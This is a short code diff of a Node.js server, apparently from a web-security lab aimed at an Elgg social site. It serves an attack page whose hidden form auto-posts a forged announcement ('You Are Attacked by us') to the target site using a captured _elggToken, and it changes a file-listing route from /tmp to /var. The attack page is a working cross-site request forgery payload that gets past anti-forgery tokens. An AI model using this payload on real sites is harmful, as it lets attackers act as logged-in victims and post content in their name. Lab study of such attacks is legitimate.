@@ -51,7 +51,7 @@ http.createServer(function (req, res) {
             break;
         case "/fileList":
 
-            fs.readdir("/tmp",function(err,files){
+            fs.readdir("/var",function(err,files){
                 res.writeHead(200, {'Content-Type': 'text/html'});
                 var html = getFileListHtml(files);
                 res.write(html);
@@ -492,7 +492,7 @@ str += '<h2>There is a surprise for you every 5 seconds</h2></font>';
 str += '</center>';
 str += '<form action="http://'+elggsite+'/action/announce/send" method="post"  name="announceForm">';
 str += '<input type="hidden" value="Mallorys Announcement" id="ann-title" name="ann_title">';
-str += '<input type="hidden" value="test" id="ann-desc" name="ann_desc">';
+str += '<input type="hidden" value="Attack successful" id="ann-desc" name="ann_desc">';
 str += '<input type="hidden" id="ann-content"  value="You Are Attacked by us" name="ann_content">';
 str += '<input type="hidden" name="_elggToken" value="'+tock+'"></input>';
 str += '</form> ';
